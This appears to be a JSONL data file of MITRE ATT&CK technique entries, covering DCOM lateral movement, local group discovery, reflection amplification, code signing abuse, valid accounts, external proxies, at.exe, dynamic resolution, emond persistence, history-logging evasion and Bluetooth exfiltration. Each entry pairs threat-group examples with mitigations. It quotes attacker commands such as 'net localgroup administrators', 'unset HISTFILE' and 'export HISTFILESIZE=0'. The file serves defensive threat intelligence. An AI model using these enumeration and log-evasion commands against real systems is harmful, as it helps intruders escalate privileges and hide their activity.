{"text": " Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user. The Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)(Citation: Microsoft COM) Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.(Citation: Microsoft COM ACL) Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) (DDE) execution directly through a COM created instance of a Microsoft Office application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document. DCOM can be", "idx": "https://attack.mitre.org/techniques/T1021/003", "title": "Distributed Component Object Model", "entity": "Distributed Component Object Model", "entity_type": "techniques", "entity_context": ["Empire can utilize <code>Invoke-DCOM</code> to leverage remote COM execution for lateral movement.", "Enable Windows firewall, which prevents DCOM instantiation by default.", "Cobalt Strike can deliver Beacon payloads for lateral movement by leveraging remote COM execution.", "Consider disabling DCOM through Dcomcnfg.exe.", "Ensure all COM alerts and Protected View are enabled.", "Modify Registry settings (directly or using Dcomcnfg.exe) in `HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\AppID\\{{AppID_GUID}}` associated with the process-wide security of individual COM applications.\n\nModify Registry settings (directly or using Dcomcnfg.exe) in `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Ole` associated with system-wide security defaults for all COM applications that do not set their own process-wide security. "], "is_subtechnique": true}
{"text": " Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group. Commands such as <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.", "idx": "https://attack.mitre.org/techniques/T1069/001", "title": "Local Groups", "entity": "Local Groups", "entity_type": "techniques", "entity_context": ["OilRig has used <code>net localgroup administrators</code> to find local administrators on compromised systems.", "Cobalt Strike can use <code>net localgroup</code> to list local groups on a system.", "Caterpillar WebShell can obtain a list of local groups of users from a system.", "Chimera has used <code>net localgroup administrators</code> to identify  accounts with local administrative rights.", "Operation Wocao has used the command <code>net localgroup administrators</code> to list all administrators part of a local group.", "BloodHound can collect information about local groups and members.", "PoshC2 contains modules, such as <code>Get-LocAdm</code> for enumerating permission groups.", "POWRUNER may collect local group information by running <code>net localgroup administrators</code> or a series of other commands on a victim.", "Commands such as <code>net group</code> and <code>net localgroup</code> can be used in Net to gather information about and manipulate groups.", "Turla has used <code>net localgroup</code> and <code>net localgroup Administrators</code> to enumerate group information, including members of the local administrators group.", "Epic gathers information on local group names.", "QakBot can use <code>net localgroup</code> to enable discovery of local groups.", "Kwampirs collects a list of users belonging to the local users and administrators groups with the commands <code>net localgroup administrators</code> and <code>net localgroup users</code>.", "FlawedAmmyy enumerates the privilege level of the victim during the initial infection.", "Helminth has checked the local administrators group.", "Tonto Team has used the <code>ShowLocalGroupDetails</code> command to identify administrator, user, and guest accounts on a compromised host.", "Kazuar gathers information about local groups and members.", "admin@338 actors used the following command following exploitation of a machine with LOWBALL malware to list local groups: <code>net localgroup administrator >> %temp%\\download</code>", "Emissary has the capability to execute the command <code>net localgroup administrators</code>.", "OSInfo has enumerated the local administrators group.", "JPIN can obtain the permissions of the victim user.", "Sys10 collects the group name of the logged-in user and sends it to the C2."], "is_subtechnique": true}
{"text": " Adversaries may attempt to cause a denial of service by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflector may be used to focus traffic on the target.(Citation: Cloudflare ReflectionDoS May 2017) Reflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS(Citation: Cloudflare DNSamplficationDoS) and NTP(Citation: Cloudflare NTPamplifciationDoS), though the use of several others in the wild have been documented.(Citation: Arbor AnnualDoSreport Jan 2018) In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.(Citation: Cloudflare Memcrashed Feb 2018)", "idx": "https://attack.mitre.org/techniques/T1498/002", "title": "Reflection Amplification", "entity": "Reflection Amplification", "entity_type": "techniques", "entity_context": ["When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations.\n\nDepending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport.\n\nAs immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents."], "is_subtechnique": true}
{"text": " Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) The certificates used during an operation may be created, acquired, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Unlike [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), this activity will result in a valid signature. Code signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing) Code signing certificates may be used to bypass security policies that require signed code to execute on a system.", "idx": "https://attack.mitre.org/techniques/T1553/002", "title": "Code Signing", "entity": "Code Signing", "entity_type": "techniques", "entity_context": ["Ecipekac has used a valid, legitimate digital signature to evade detection.", "Anchor has been signed with valid certificates to evade detection by security tools.", "Janicab used a valid AppleDeveloperID to sign the code to get past security restrictions.", "CopyKittens digitally signed an executable with a stolen certificate from legitimate company AI Squared.", "More_eggs has used a signed binary shellcode loader and a signed Dynamic Link Library (DLL) to create a reverse shell.", "Honeybee uses a dropper called MaoCheng that harvests a stolen digital signature from Adobe Systems.", "APT29 was able to get SUNBURST signed by SolarWinds code signing certificates by injecting the malware into the SolarWinds Orion software lifecycle.", "Cobalt Strike can use self signed Java applets to execute signed applet attacks.", "Darkhotel has used code-signing certificates on its malware that are either forged due to weak keys or stolen. Darkhotel has also stolen certificates and signed backdoors and downloaders with them.", "Helminth samples have been signed with legitimate, compromised code signing certificates owned by software company AI Squared.", "SpicyOmelette has been signed with valid digital certificates.", "GALLIUM has used stolen certificates to sign its tools including those from Whizzimo LLC.", "Wizard Spider has used Digicert code-signing certificates for some of its malware.", "menuPass has resized and added data to the certificate table to enable the signing of modified files with legitimate signatures.", "A QuasarRAT .dll file is digitally signed by a certificate from AirVPN.", "Winnti Group used stolen certificates to sign its malware.", "Leviathan has used stolen code signing certificates to sign malware.", "PROMETHIUM has signed code with self-signed certificates.", "Some Daserf samples were signed with a stolen digital certificate.", "ChChes samples were digitally signed with a certificate originally used by Hacking Team that was later leaked and subsequently revoked.", "FIN6 has used Comodo code-signing certificates.\t", "Suckfly has used stolen certificates to sign its malware.", "Molerats has used forged Microsoft code-signing certificates on malware.", "AppleJeus has used a valid digital signature from Sectigo to appear legitimate. ", "APT41 leveraged code-signing certificates to sign malware when targeting both gaming and non-gaming organizations.", "Turla has used valid digital certificates from Sysprint AG to sign its Epic dropper.", "QakBot can use signed loaders to evade detection.\n", "CSPY Downloader has come signed with revoked certificates.", "Nerex drops a signed Microsoft DLL to disk.", "PipeMon, its installer, and tools are signed with stolen code-signing certificates.", "StrongPity has been signed with self-signed certificates.", "Ebury has installed a self-signed RPM package mimicking the original system package on RPM based systems.", "BOOSTWRITE has been signed by a valid CA.", "Metamorfo has digitally signed executables using AVAST Software certificates. ", "RTM samples have been signed with a code-signing certificates.", "BLINDINGCAN has been signed with code-signing certificates such as CodeRipper.", "Stuxnet used a digitally signed driver with a compromised Realtek certificate.", "TrickBot has come with a signed downloader component.", "Gazer versions are signed with various valid certificates; one was likely faked and issued by Comodo for \"Solid Loop Ltd,\" and another was issued for \"Ultimate Computer Support Ltd.\"", "BackConfig has been signed with self signed digital certificates mimicking a legitimate software company.", "LockerGoga has been signed with stolen certificates in order to make it look more legitimate.", "Kimsuky has signed files with the name EGIS CO,. Ltd..", "FIN7 has signed Carbanak payloads with legally purchased code signing certificates. FIN7 has also digitally signed their phishing documents, backdoors and other staging tools to bypass security controls.", "SUNBURST was digitally signed by SolarWinds from March - May 2020.", "TA505 has signed payloads with code signing certificates from Thawte and Sectigo.", "GreyEnergy digitally signs the malware with a code-signing certificate.", "Clop can use code signing to evade detection.", "Bazar has been signed with fake certificates including those appearing to be from VB CORPORATE PTY. LTD.", "Patchwork has signed malware with self-signed certificates from fictitious and spoofed legitimate software companies.", "Bandook was signed with valid Certum certificates. ", "Silence has used a valid certificate to sign their primary loader Silence.Downloader (aka TrueBot)."], "is_subtechnique": true}
{"text": " Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence. The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. (Citation: TechNet Credential Theft)", "idx": "https://attack.mitre.org/techniques/T1078", "title": "Valid Accounts", "entity": "Valid Accounts", "entity_type": "techniques", "entity_context": ["To move laterally on a victim network, FIN6 has used credentials stolen from various systems on which it gathered usernames and password hashes.", "FIN5 has used legitimate VPN, RDP, Citrix, or VNC credentials to maintain access to a victim environment.", "APT41 used compromised credentials to log on to other systems.", "APT33 has used valid accounts for initial access and privilege escalation.", "Fox Kitten has used valid credentials with various services during lateral movement.", "Dragonfly 2.0 compromised user credentials and used valid accounts for operations.", "Kinsing has used valid SSH credentials to access remote hosts.", "Silence has used compromised credentials to log on to other systems and escalate privileges.", "APT39 has used stolen credentials to compromise Outlook Web Access (OWA).", "FIN10 has used stolen credentials to connect remotely to victim networks using VPNs protected with only a single factor.", "menuPass has used valid accounts including shared between Managed Service Providers and clients to move between the two environments.", "Suckfly used legitimate account credentials that they dumped to navigate the internal victim network as though they were the legitimate account owner.", "Ensure that applications do not store sensitive data or credentials insecurely. (e.g. plaintext credentials in code, published credentials in repositories, or credentials in public cloud storage).", "Wizard Spider has used valid credentials for privileged accounts with the goal of accessing domain controllers. ", "Sandworm Team have used previously acquired legitimate credentials prior to attacks.", "TEMP.Veles has used compromised VPN accounts.\t", "Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications.", "Adversaries can instruct Duqu to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.", "Operation Wocao has used valid VPN credentials to gain initial access.", "Industroyer can use supplied user credentials to execute processes and stop services.", "Applications and appliances that utilize default username and password should be changed immediately after the installation, and before deployment to a production environment.  When possible, applications that use SSH keys should be updated periodically and properly secured.", "APT29 used different compromised credentials for remote access and to move laterally.", "Carbanak actors used legitimate credentials of banking employees to perform operations that sent them millions of dollars.", "Night Dragon has used compromised VPN accounts to gain access to victim systems.", "Some SeaDuke samples have a module to extract email from Microsoft Exchange servers using compromised credentials.", "Dtrack used hard-coded credentials to gain access to a network share.", "Chimera has used a valid account to maintain persistence via scheduled task.", "FIN8 has used valid accounts for persistence and lateral movement.", "Threat Group-3390 actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks.", "Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.   These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. ", "Linux Rabbit acquires valid SSH accounts through brute force. ", "OilRig has used compromised credentials to access other systems on a victim network.", "Silent Librarian has used compromised credentials to obtain unauthorized access to online accounts.", "FIN4 has used legitimate credentials to hijack email communications.", "APT28 has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network. The group has specifically used credentials stolen through a spearphishing email to login to the DCCC network. The group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via IoT devices such as a VOIP phone, printer, and video decoder.", "GALLIUM leveraged valid accounts to maintain access to a victim network.", "Leviathan has obtained valid accounts to gain initial access.", "FIN7 has harvested valid administrative credentials for lateral movement.", "PittyTiger attempts to obtain legitimate credentials during operations.", "APT18 actors leverage legitimate credentials to log into external remote services."], "is_subtechnique": false}
{"text": " Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion. External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.", "idx": "https://attack.mitre.org/techniques/T1090/002", "title": "External Proxy", "entity": "External Proxy", "entity_type": "techniques", "entity_context": ["APT28 used other victims as proxies to relay command traffic, for instance using a compromised Georgian military email server as a hop point to NATO victims. The group has also used a tool that acts as a proxy to allow C2 even if the victim is behind a router. APT28 has also used a machine to relay and obscure communications between CHOPSTICK and their server.", "QakBot has a module that can proxy C2 communications.", "Regin leveraged several compromised universities as proxies to obscure its origin.", "An APT3 downloader establishes SOCKS5 connections for its initial C2.", "InvisiMole InvisiMole can identify proxy servers used by the victim and use them for C2 communication.", "TrickBot has been known to reach a command and control server via one of nine proxy IP addresses.  ", "Okrum can identify proxy servers configured and used by the victim, and use it to make HTTP requests to C2 its server.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific C2 protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.", "FIN5 maintains access to victim environments by using FLIPSIDE to create a proxy for a backup RDP tunnel.", "Lazarus Group uses multiple proxies to obfuscate network traffic from victims.", "menuPass has used a global service provider's IP as a proxy for C2 traffic from a victim.", "Tonto Team has routed their traffic through an external server in order to obfuscate their location.", "POWERSTATS has connected to C2 servers through proxies.", "GALLIUM used a modified version of HTRAN to redirect connections between networks.", "ShimRat can use pre-configured HTTP proxies.", "MuddyWater has controlled POWERSTATS from behind a proxy network to obfuscate the C2 location. MuddyWater has used a series of compromised websites that victims connected to randomly to relay information to command and control (C2).", "Silence has used ProxyBot, which allows the attacker to redirect traffic from the current node to the backconnect server via Sock4\\Socks5.\t", "APT39 has used various tools to proxy C2 communications."], "is_subtechnique": true}
{"text": " Adversaries may abuse the <code>at.exe</code> utility to perform task scheduling for initial or recurring execution of malicious code. The [at](https://attack.mitre.org/software/S0110) utility exists as an executable within Windows for scheduling tasks at a specified time and date. Using [at](https://attack.mitre.org/software/S0110) requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. An adversary may use <code>at.exe</code> in Windows environments to execute programs at system startup or on a scheduled basis for persistence. [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM). Note: The <code>at.exe</code> command line utility has been deprecated in current versions of Windows in favor of <code>schtasks</code>.", "idx": "https://attack.mitre.org/techniques/T1053/002", "title": "At (Windows)", "entity": "At (Windows)", "entity_type": "techniques", "entity_context": ["APT18 actors used the native at Windows task scheduler tool to use scheduled tasks for execution on a victim network.", "BRONZE BUTLER has used at to register a scheduled task to execute malware during lateral movement.", "Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM. The associated Registry key is located at <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl</code>. The setting can be configured through GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled.  ", "Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems. ", "Configure the Increase Scheduling Priority option to only allow the Administrators group the rights to schedule a priority process. This can be configured through GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Increase scheduling priority. ", "at can be used to schedule a task on a system.", "CrackMapExec can set a scheduled task on the target system to execute commands remotely using at.", "Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.  Windows operating system also creates a registry key specifically associated with the creation of a scheduled task on the destination host at: Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\At1. ", "MURKYTOP has the capability to schedule remote AT jobs.", "Threat Group-3390 actors use at to schedule tasks to run self-extracting RAR archives, which install HTTPBrowser or PlugX on other victims on a network."], "is_subtechnique": true}
{"text": " Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control. Adversaries may use dynamic resolution for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)", "idx": "https://attack.mitre.org/techniques/T1568", "title": "Dynamic Resolution", "entity": "Dynamic Resolution", "entity_type": "techniques", "entity_context": ["APT29 used dynamic DNS resolution to construct and resolve to randomly-generated subdomains for C2.", "Transparent Tribe has used dynamic DNS services to set up C2.", "Maze has forged POST strings with a random choice from a list of possibilities including \"forum\", \"php\", \"view\", etc. while making connection with the C2, hindering detection efforts.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Malware researchers can reverse engineer malware variants that use dynamic resolution and determine future C2 infrastructure that the malware will attempt to contact, but this is a time and resource intensive effort.", "SUNBURST dynamically resolved C2 infrastructure for randomly-generated subdomains within a parent domain.", "In some cases a local DNS sinkhole may be used to help prevent behaviors associated with dynamic resolution.", "NETEAGLE can use HTTP to download resources that contain an IP address and port number pair to connect to for C2.", "RTM has resolved Pony C2 server IP addresses by either converting Bitcoin blockchain transaction data to specific octets, or accessing IP addresses directly within the Namecoin blockchain."], "is_subtechnique": false}
{"text": " Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL)(Citation: NVD CVE-2016-6662), standard services (like SMB(Citation: CIS Multiple SMB Vulnerabilities) or SSH), network device administration and management protocols (like SNMP and Smart Install(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)), and any other applications with Internet accessible open sockets, such as web servers and related services.(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may include [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211). If an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies. For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)", "idx": "https://attack.mitre.org/techniques/T1190", "title": "Exploit Public-Facing Application", "entity": "Exploit Public-Facing Application", "entity_type": "techniques", "entity_context": ["Operation Wocao has gained initial access via vulnerable webservers.", "Night Dragon has performed SQL injection attacks of extranet web servers to gain access.", "Application isolation will limit what other processes and system features the exploited target can access.", "APT29 has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access. They have also exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network.", "Update software regularly by employing patch management for externally exposed applications.", "APT28 has used a variety of public exploits, including CVE 2020-0688 and CVE 2020-17144, to gain execution on vulnerable Microsoft Exchange; they have also conducted SQL injection attacks against external websites.", "menuPass has leveraged vulnerabilities in Pulse Secure VPNs to hijack sessions.", "Fox Kitten has exploited known vulnerabilities in Fortinet, PulseSecure, and Palo Alto VPN appliances.", "Blue Mockingbird has gained initial access by exploiting CVE-2019-18935, a vulnerability within Telerik UI for ASP.NET AJAX.", "Axiom has been observed using SQL injection to gain access to systems.", "APT39 has used SQL injection for initial compromise.", "Regularly scan externally facing systems for vulnerabilities and establish procedures to rapidly patch systems when critical vulnerabilities are discovered through scanning and through public disclosure.", "Web Application Firewalls may be used to limit exposure of applications to prevent exploit traffic from reaching the application.", "sqlmap can be used to automate exploitation of SQL injection vulnerabilities.", "Segment externally facing servers and services from the rest of the network with a DMZ or on separate hosting infrastructure.", "BlackTech has exploited a buffer overflow vulnerability in Microsoft Internet Information Services (IIS) 6.0, CVE-2017-7269, in order to establish a new HTTP or command and control (C2) server.", "SoreFang can gain access by exploiting a Sangfor SSL VPN vulnerability that allows for the placement and delivery of malicious update binaries.", "Rocke exploited Apache Struts, Oracle WebLogic (CVE-2017-10271), and Adobe ColdFusion (CVE-2017-3066) vulnerabilities to deliver malware.", "GALLIUM exploited a publicly-facing servers including Wildfly/JBoss servers to gain access to the network.", "Use least privilege for service accounts will limit what permissions the exploited process gets on the rest of the system.", "GOLD SOUTHFIELD has exploited Oracle WebLogic vulnerabilities for initial compromise.", "APT41 exploited CVE-2020-10189 against Zoho ManageEngine Desktop Central, and CVE-2019-19781 to compromise Citrix Application Delivery Controllers (ADC) and gateway devices.", "Volatile Cedar has targeted publicly facing web servers, with both automatic and manual vulnerability discovery.  ", "BackdoorDiplomacy has exploited CVE-2020-5902, an F5 BIP-IP vulnerability, to drop a Linux backdoor. BackdoorDiplomacy has also exploited mis-configured Plesk servers.", "Siloscape is executed after the attacker gains initial access to a Windows container using a known vulnerability. ", "Havij is used to automate SQL injection."], "is_subtechnique": false}
{"text": " Adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations. Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about networks may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).", "idx": "https://attack.mitre.org/techniques/T1590", "title": "Gather Victim Network Information", "entity": "Gather Victim Network Information", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties.", "HAFNIUM gathered the fully qualified domain names (FQDNs) for targeted Exchange servers in the victim's environment."], "is_subtechnique": false}
{"text": " Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place. The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) service.", "idx": "https://attack.mitre.org/techniques/T1546/014", "title": "Emond", "entity": "Emond", "entity_type": "techniques", "entity_context": ["Consider disabling emond by removing the Launch Daemon plist file."], "is_subtechnique": true}
{"text": " Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. On Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected. Adversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. On Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries", "idx": "https://attack.mitre.org/techniques/T1562/003", "title": "Impair Command History Logging", "entity": "Impair Command History Logging", "entity_type": "techniques", "entity_context": ["Prevent users from changing the <code>HISTCONTROL</code>, <code>HISTFILE</code>, and <code>HISTFILESIZE</code> environment variables. ", "Make sure that the <code>HISTCONTROL</code> environment variable is set to “ignoredups” instead of “ignoreboth” or “ignorespace”.", "APT38 has prepended a space to all of their terminal commands to operate without leaving traces in the HISTCONTROL environment."], "is_subtechnique": true}
{"text": " Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an attacker may opt to exfiltrate data using a Bluetooth communication channel. Adversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.", "idx": "https://attack.mitre.org/techniques/T1011/001", "title": "Exfiltration Over Bluetooth", "entity": "Exfiltration Over Bluetooth", "entity_type": "techniques", "entity_context": ["Flame has a module named BeetleJuice that contains Bluetooth functionality that may be used in different ways, including transmitting encoded information from the infected system over the Bluetooth protocol, acting as a Bluetooth beacon, and identifying other Bluetooth devices in the vicinity.", "Prevent the creation of new network adapters where possible.", "Disable Bluetooth in local computer security settings or by group policy if it is not needed within an environment."], "is_subtechnique": true}
